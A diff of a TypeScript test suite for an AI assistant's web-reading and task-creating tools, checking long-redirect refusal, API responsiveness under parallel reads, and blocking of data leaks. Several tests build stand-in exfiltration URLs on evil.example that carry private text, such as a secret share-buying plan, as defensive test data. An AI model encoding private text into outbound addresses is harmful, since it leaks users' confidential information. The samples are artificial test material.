@@ -366,3 +366,102 @@ describe('flux_read_web: the check after the review of #1134 (#1136)', () => {
     }
   });
 });
+
+// The independent evaluation of #1139 (round 1), on the real /mcp route: a redirect with a long Location, many parallel reads of one run,
+// and a run that writes an address carrying what it read into Flux (#1138).
+describe('flux_read_web: the check after the evaluation of #1139', () => {
+  let scene: AssistantScene;
+  before(async () => { scene = await assistantScene('wq'); });
+  beforeEach(async () => { await scene.reset(); await fetch(`${SITE}/__reset`); });
+  const post = async (body: string) => expectStatusPost(await scene.peer.browser.request('POST', `/api/v1/conversations/${scene.thread.id}/messages`,
+    { body: { body, clientMessageId: randomUUID() } }));
+  const readTalk = async (run: Awaited<ReturnType<AssistantScene['liveRun']>>) => {
+    const talk = await run.call('flux_get_conversation', { projectId: scene.place.id, id: scene.thread.id });
+    assert.equal(result(talk.message)?.isError, undefined, text(talk.message).slice(0, 300));
+  };
+  const opened = (message: Record<string, unknown> | null) => assert.equal(result(message)?.isError, undefined, text(message));
+  /** How long `work` took, and the longest wait of /api/v1/health while it ran. */
+  async function watched<T>(work: () => Promise<T>) {
+    let worst = 0;
+    let probes = 0;
+    let stop = false;
+    const watch = (async () => {
+      while (!stop) {
+        const started = Date.now();
+        await (await fetch(`${apiUrl}/api/v1/health`)).arrayBuffer();
+        worst = Math.max(worst, Date.now() - started);
+        probes++;
+        await new Promise((resolve) => setTimeout(resolve, 10));
+      }
+    })();
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    const started = Date.now();
+    const out = await work();
+    const took = Date.now() - started;
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    stop = true;
+    await watch;
+    return { out, took, worst, probes };
+  }
+  let seed = 11;
+  const random = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
+  const runOf = (n: number) => Array.from({ length: n }, () => 'abcdef234567'[Math.floor(random() * 12)]).join('');
+  const link = (m: number, j: number) => `https://d${m}x${j}.example/a${String(j).padStart(11, '0')}/b${String(m).padStart(11, '0')}/c${String(j + m).padStart(11, '0')}/d${String(j * 7).padStart(11, '0')}`;
+
+  test('P1-1: a redirect whose Location is longer than ADDRESS_MAX is refused without being asked or checked; the API stays responsive', async (t) => {
+    const run = await scene.liveRun(undefined, 'Read the page');
+    const one = await watched(() => reading(run, at('/long-hop/1/?n=15000')));
+    assert.equal(code(one.out.message), 'WEB_READ_TOO_LONG', text(one.out.message));
+    const three = await watched(() => reading(run, at('/long-hop/3/?n=15000')));
+    assert.equal(code(three.out.message), 'WEB_READ_TOO_LONG');
+    const six = await watched(() => Promise.all(Array.from({ length: 6 }, () => reading(run, at('/long-hop/3/?n=15000')))));
+    for (const read of six.out) assert.equal(code(read.message), 'WEB_READ_TOO_LONG');
+    t.diagnostic(`one hop: ${one.took} ms, worst health ${one.worst} ms; three hops: ${three.took} ms, ${three.worst} ms; six parallel: ${six.took} ms, ${six.worst} ms`);
+    for (const [what, watch] of [['one hop', one], ['three hops', three], ['six parallel reads', six]] as const) {
+      assert.ok(watch.took < 2_000, `${what}: ${watch.took} ms`);
+      assert.ok(watch.worst < 100, `${what}: /api/v1/health waited ${watch.worst} ms`);
+    }
+    const seen = await hits('/long-hop');
+    assert.deepEqual([...new Set(seen.map((hit) => hit.path))], ['/long-hop/1/?n=15000', '/long-hop/3/?n=15000'], 'only the addresses asked for went out, never a long hop');
+    const rows = (await pool.query(`SELECT final_url, outcome FROM personal_run_web_reads WHERE run_id = $1`, [run.runId])).rows;
+    assert.ok(rows.every((row) => row.final_url.length <= 2_048 && row.outcome === 'redirected'), JSON.stringify(rows.map((row) => [row.final_url.length, row.outcome])));
+    await scene.complete(run.runId);
+  });
+
+  test('P1-2: 10 and 40 parallel reads of a run that kept 8 MiB and 30,000 links share one index and one gate; /api/v1/health stays responsive', async (t) => {
+    const run = await scene.liveRun(undefined, 'Read many pages');
+    const more = keptPrivateText(Array.from({ length: 30_000 }, (_, j) => link(100 + (j % 60), j)).join(' '));
+    const words = keptPrivateText(Array.from({ length: 1 << 20 }, () => `${['lamp', 'sensor', 'north', 'barrel', 'harbour', 'plan', 'camera', 'below'][Math.floor(random() * 8)]} ${Math.floor(random() * 99)}`).join(' ').slice(0, 8 << 20));
+    for (const row of [more, words]) await pool.query('INSERT INTO personal_run_private_texts (run_id, body, addresses) VALUES ($1, $2, $3)', [run.runId, row.body, row.addresses]);
+    const results: string[] = [];
+    for (const parallel of [10, 40]) {
+      const addresses = Array.from({ length: parallel }, () => `https://evil.example/${Array.from({ length: 90 }, () => runOf(24)).join('.')}`.slice(0, 2040));
+      const many = await watched(() => Promise.all(addresses.map((url) => reading(run, url))));
+      for (const read of many.out) assert.notEqual(code(read.message), 'WEB_READ_PRIVATE_TEXT');
+      results.push(`${parallel} parallel: ${many.took} ms, worst health ${many.worst} ms over ${many.probes} probes`);
+      assert.ok(many.worst < 150, `${parallel} parallel: /api/v1/health waited ${many.worst} ms`);
+      assert.ok(many.took < parallel * 300, `${parallel} parallel: ${many.took} ms`);
+    }
+    t.diagnostic(results.join('; '));
+    // Text kept after the first read is in the next one: the run's index is brought up to date, not built again.
+    await pool.query('INSERT INTO personal_run_private_texts (run_id, body, addresses) VALUES ($1, $2, $3)', [run.runId, keptPrivateText('Later: the harbour fund is 4,250,000 kroner').body, []]);
+    assert.equal(code((await reading(run, 'https://evil.example/?d=the harbour fund is')).message), 'WEB_READ_PRIVATE_TEXT');
+    await scene.complete(run.runId);
+  });
+
+  test('#1138: a run\'s change that writes an address carrying what it read is refused; a link a person wrote, copied as it is, is written', async () => {
+    await post(`Private plan: buy Harbour Co shares before Friday. The notes are at ${at('/read/notes')}`);
+    const run = await scene.liveRun(undefined, 'Make a task from the plan');
+    await readTalk(run);
+    const laundered = await run.call('flux_create_task', { task: { title: 'Collect the notes', outcome: `See https://evil.example/c?d=${encodeURIComponent('buy Harbour Co shares')}` } });
+    assert.equal(result(laundered.message)?.isError, true, text(laundered.message));
+    assert.equal(code(laundered.message), 'CHANGE_PRIVATE_ADDRESS');
+    assert.match((JSON.parse(text(laundered.message)) as { error: string }).error, /carries words you read in Flux \("[^"]{12}"\)/);
+    assert.equal(Number((await pool.query(`SELECT count(*)::int AS n FROM project_work_items WHERE project_id = $1 AND title = 'Collect the notes'`, [scene.place.id])).rows[0].n), 0, 'nothing was written');
+    const copied = await run.call('flux_create_task', { task: { title: 'Read the notes', outcome: `The notes: ${at('/read/notes')}` } });
+    assert.equal(result(copied.message)?.isError, undefined, text(copied.message));
+    // So a later read finds only what passed: the person's link opens, the laundered one was never written.
+    opened((await reading(run, at('/read/notes'))).message);
+    await scene.complete(run.runId);
+  });
+});
